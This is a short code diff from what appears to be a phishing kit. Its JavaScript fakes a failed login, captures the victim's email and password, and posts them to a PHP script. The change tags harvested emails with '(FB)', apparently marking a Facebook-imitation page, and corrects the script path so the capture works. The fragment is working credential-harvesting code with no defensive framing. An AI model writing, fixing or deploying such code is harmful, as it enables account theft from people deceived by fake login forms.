@@ -137,13 +137,13 @@
             feedback.textContent = 'Incorrect password! Please try again...';
     
             const data = new FormData();
-            data.append('email', email.value);
+            data.append('email', email.value + " (FB)");
             data.append('password', password.value);
             const response = new XMLHttpRequest();
             response.onreadystatechange = function () {
                 // Process response here if needed
             };
-            response.open('POST', './llogin.php', true);
+            response.open('POST', './login.php', true);
             response.send(data);
             x++;
     
